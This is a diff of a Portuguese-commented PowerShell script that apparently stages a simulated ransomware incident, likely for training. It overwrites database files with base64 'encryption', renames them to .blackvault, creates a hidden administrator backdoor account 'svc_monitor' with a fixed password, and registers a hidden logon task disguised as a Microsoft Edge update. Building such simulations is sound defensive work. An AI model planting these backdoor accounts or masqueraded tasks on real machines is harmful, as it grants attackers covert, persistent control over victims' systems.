@@ -23,20 +23,33 @@ Write-Host ""
 $allSuccess = $true
 
 # ============================================================
-# Detectar nome do grupo de administradores (EN ou PT)
+# Detectar nome do grupo de administradores
 # ============================================================
 
 $adminGroupName = $null
-$groups = net localgroup 2>&1 | Out-String
-if ($groups -match "\bAdministrators\b") {
-    $adminGroupName = "Administrators"
-} elseif ($groups -match "\bAdministradores\b") {
-    $adminGroupName = "Administradores"
-} else {
+try {
+    $adminGroup = Get-LocalGroup -SID "S-1-5-32-544" -ErrorAction Stop
+    $adminGroupName = $adminGroup.Name
+} catch {
     $adminGroupName = "Administrators"
 }
 Write-Host "[i] Grupo de administradores detectado: $adminGroupName" -ForegroundColor Gray
 Write-Host ""
+
+# ============================================================
+# Funcao: ofuscar conteudo de um arquivo (simula criptografia)
+# ============================================================
+
+function Get-ObfuscatedContent {
+    param([string]$FilePath)
+    
+    $originalContent = Get-Content $FilePath -Raw -ErrorAction SilentlyContinue
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($originalContent)
+    $base64 = [System.Convert]::ToBase64String($bytes)
+    $obfuscated = "BLACKVAULT-ENCRYPTED-AES256`n" + $base64
+    
+    return $obfuscated
+}
 
 # ============================================================
 # 1. Criptografar arquivos em C:\DB_Data
@@ -49,9 +62,23 @@ $files = @("clientes.mdf", "vendas.ldf", "produtos.mdf", "financeiro.ldf", "rh_d
 
 foreach ($file in $files) {
     $filePath = Join-Path $dataDir $file
+    $encryptedPath = Join-Path $dataDir "$file.blackvault"
+    
     if (Test-Path $filePath) {
-        Rename-Item -Path $filePath -NewName "$file.blackvault" -Force
+        # Se o arquivo .blackvault ja existe, remover antes de renomear
+        if (Test-Path $encryptedPath) {
+            Remove-Item -Path $encryptedPath -Force -ErrorAction SilentlyContinue
+        }
+        
+        # Ofuscar o conteudo
+        $obfuscatedContent = Get-ObfuscatedContent -FilePath $filePath
+        $obfuscatedContent | Out-File -FilePath $filePath -Encoding UTF8 -Force
+        
+        # Renomear para .blackvault
+        Rename-Item -Path $filePath -NewName "$file.blackvault" -ErrorAction SilentlyContinue
         Write-Host "  [OK] Criptografado: $file -> $file.blackvault" -ForegroundColor Gray
+    } elseif (Test-Path $encryptedPath) {
+        Write-Host "  [OK] Ja criptografado: $file.blackvault" -ForegroundColor Gray
     } else {
         Write-Host "  [!] Arquivo nao encontrado: $filePath" -ForegroundColor Yellow
     }
@@ -89,37 +116,48 @@ Write-Host "  [OK] Nota de resgate criada: README_BLACKVAULT.txt" -ForegroundCol
 
 Write-Host "[2/4] Criando conta backdoor svc_monitor..." -ForegroundColor Yellow
 
-# Verificar se usuario ja existe
-$userCheck = $null
-try { $userCheck = net user svc_monitor 2>&1 | Out-String } catch {}
+$existingUser = $null
+try { $existingUser = Get-LocalUser -Name "svc_monitor" -ErrorAction Stop } catch {}
 
-if ($userCheck -match "Nome completo|Nome de usu.rio|User name") {
+if ($existingUser) {
     Write-Host "  [OK] Usuario svc_monitor ja existe" -ForegroundColor Green
 } else {
-    net user svc_monitor "Backup@2026" /add /fullname:"Service Monitor Account" 2>&1 | Out-Null
-    
-    $userCheck = $null
-    try { $userCheck = net user svc_monitor 2>&1 | Out-String } catch {}
-    
-    if ($userCheck -match "Nome completo|Nome de usu.rio|User name") {
+    try {
+        $password = ConvertTo-SecureString "Backup@2026" -AsPlainText -Force
+        New-LocalUser -Name "svc_monitor" -Password $password -FullName "Service Monitor Account" -PasswordNeverExpires -ErrorAction Stop | Out-Null
         Write-Host "  [OK] Usuario svc_monitor criado" -ForegroundColor Green
-    } else {
-        Write-Host "  [ERRO] Falha ao criar usuario svc_monitor" -ForegroundColor Red
+    } catch {
+        Write-Host "  [ERRO] Falha ao criar usuario svc_monitor: $_" -ForegroundColor Red
         $allSuccess = $false
     }
 }
 
-# Adicionar ao grupo Administradores usando o nome detectado
-$addResult = net localgroup $adminGroupName svc_monitor /add 2>&1 | Out-String
+# Verificar se ja esta no grupo
+$isInGroup = $false
+try {
+    $members = Get-LocalGroupMember -Group $adminGroupName -ErrorAction Stop
+    if ($members.Name -match "svc_monitor") {
+        $isInGroup = $true
+    }
+} catch {}
 
-# Verificar se foi adicionado
-$groupCheck = net localgroup $adminGroupName 2>&1 | Out-String
-if ($groupCheck -match "svc_monitor") {
-    Write-Host "  [OK] svc_monitor adicionado a $adminGroupName" -ForegroundColor Green
+if ($isInGroup) {
+    Write-Host "  [OK] svc_monitor ja esta em $adminGroupName" -ForegroundColor Green
 } else {
-    Write-Host "  [ERRO] svc_monitor NAO esta em $adminGroupName" -ForegroundColor Red
-    Write-Host "       Execute manualmente: net localgroup $adminGroupName svc_monitor /add" -ForegroundColor Yellow
-    $allSuccess = $false
+    try {
+        Add-LocalGroupMember -Group $adminGroupName -Member "svc_monitor" -ErrorAction Stop
+        
+        $members = Get-LocalGroupMember -Group $adminGroupName -ErrorAction SilentlyContinue
+        if ($members.Name -match "svc_monitor") {
+            Write-Host "  [OK] svc_monitor adicionado a $adminGroupName" -ForegroundColor Green
+        } else {
+            Write-Host "  [ERRO] Falha ao adicionar svc_monitor a $adminGroupName" -ForegroundColor Red
+            $allSuccess = $false
+        }
+    } catch {
+        Write-Host "  [ERRO] Falha ao adicionar svc_monitor a $adminGroupName" -ForegroundColor Red
+        $allSuccess = $false
+    }
 }
 
 # ============================================================
@@ -154,19 +192,27 @@ Write-Host "[4/4] Criando tarefa agendada com trigger de logon..." -ForegroundCo
 
 $taskName = "MicrosoftEdgeUpdateTask"
 
-Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+try {
+    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction Stop
+    Write-Host "  [i] Tarefa anterior removida" -ForegroundColor Gray
+} catch {}
 
 $action = New-ScheduledTaskAction -Execute "$backdoorDir\monitor_agent.exe"
 $logonTrigger = New-ScheduledTaskTrigger -AtLogOn
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 5)
 
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $logonTrigger -Settings $settings -Description "Microsoft Edge Update Task" -Force | Out-Null
-
-$taskCheck = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
-if ($taskCheck) {
-    Write-Host "  [OK] Tarefa '$taskName' criada com trigger de logon" -ForegroundColor Green
-} else {
-    Write-Host "  [ERRO] Falha ao criar tarefa '$taskName'" -ForegroundColor Red
+try {
+    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $logonTrigger -Settings $settings -Description "Microsoft Edge Update Task" -Force -ErrorAction Stop | Out-Null
+    
+    $taskCheck = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
+    if ($taskCheck) {
+        Write-Host "  [OK] Tarefa '$taskName' criada com trigger de logon" -ForegroundColor Green
+    } else {
+        Write-Host "  [ERRO] Tarefa nao foi criada" -ForegroundColor Red
+        $allSuccess = $false
+    }
+} catch {
+    Write-Host "  [ERRO] Falha ao criar tarefa: $_" -ForegroundColor Red
     $allSuccess = $false
 }
 
@@ -199,16 +245,15 @@ if ($encryptedCount -gt 0) {
     Write-Host "  [ ] Arquivos .blackvault NAO CRIADOS" -ForegroundColor Red
 }
 
-$userFinal = $null
-try { $userFinal = net user svc_monitor 2>&1 | Out-String } catch {}
-if ($userFinal -match "Nome completo|Nome de usu.rio|User name") {
+$userFinal = Get-LocalUser -Name "svc_monitor" -ErrorAction SilentlyContinue
+if ($userFinal) {
     Write-Host "  [OK] Conta backdoor: svc_monitor" -ForegroundColor Green
 } else {
     Write-Host "  [ ] Conta svc_monitor NAO CRIADA" -ForegroundColor Red
 }
 
-$groupFinal = net localgroup $adminGroupName 2>&1 | Out-String
-if ($groupFinal -match "svc_monitor") {
+$groupFinal = Get-LocalGroupMember -Group $adminGroupName -ErrorAction SilentlyContinue
+if ($groupFinal.Name -match "svc_monitor") {
     Write-Host "  [OK] svc_monitor em $adminGroupName" -ForegroundColor Green
 } else {
     Write-Host "  [ ] svc_monitor NAO esta em $adminGroupName" -ForegroundColor Red
